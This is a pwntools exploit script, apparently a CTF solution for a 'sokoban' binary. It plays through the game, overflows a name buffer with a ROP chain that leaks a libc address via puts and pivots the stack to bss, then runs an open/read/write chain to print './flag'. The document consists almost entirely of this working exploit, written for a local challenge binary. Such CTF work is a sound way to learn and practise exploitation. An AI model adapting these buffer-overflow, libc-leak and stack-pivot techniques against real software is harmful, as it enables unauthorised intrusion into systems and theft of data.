#coding=utf-8
from pwn import *

context.arch = 'amd64'
elf = ELF("./sokoban")
libc = ELF('./libc-2.27.so')

prdi = 0x400f63 #: pop rdi ; ret
prsi = 0x400f61 #: pop rsi ; pop r15 ; ret
prbp = 0x400728 #: pop rbp ; ret
read_got = 0x602038
puts_plt = 0x400640
gadget1 = 0x400F5A
gadget2 = 0x400F40
bss = 0x602100 + 0x800
read_got = elf.got['read']
leave = 0x400EEF

# io = remote("")
io = process("./sokoban")

def generator():
    payload = "ddwwwwssdwwssassdwwwsssdww"
    return payload

def step(payload):
    io.recvuntil("********\n")
    io.sendline(payload)

payload = generator()
for i in range(len(payload)-1):
    step(payload[i])

for i in range(0x200):
    step("s")
    step("w")

io.sendlineafter("********\n","w")

io.recvuntil("Hero,Please leave your name:")
payload = b'A'*312
payload += p64(prdi)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(gadget1)

########### read #############
payload += p64(0)
payload += p64(1)
payload += p64(read_got)
payload += p64(0)
payload += p64(bss)
payload += p64(0x200)
payload += p64(gadget2)
payload += p64(0)*7
payload += p64(prbp)
payload += p64(bss)
payload += p64(leave)
io.send(payload)

leak = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
info(hex(leak))
libc_base = leak -0x110020
libc.address = libc_base
info(hex(libc_base))
alarm = libc.sym['alarm']
info(hex(alarm))
syscall = alarm + 5
pop_rax_ret = libc.search(asm('pop rax; ret')).next()
pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
pop_rdx_ret = libc.search(asm('pop rdx; ret')).next()
pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()
flag_addr = 0x602908 + 0x150
rop = ROP(libc)
rop.read(3 ,flag_addr,0x30)
rop.write(1,flag_addr,0x30)

open_chain = flat(
    pop_rax_ret , 2,
    pop_rdi_ret , flag_addr,
    pop_rdx_pop_rbx_ret , 0, 0,
    pop_rsi_ret , 0,
    syscall
)

chain = open_chain +  rop.chain()
payload = 'aaaaaaaa' + chain.ljust(0x150,'\x00') + './flag\x00'
# gdb.attach(io)
io.send(payload)
io.interactive()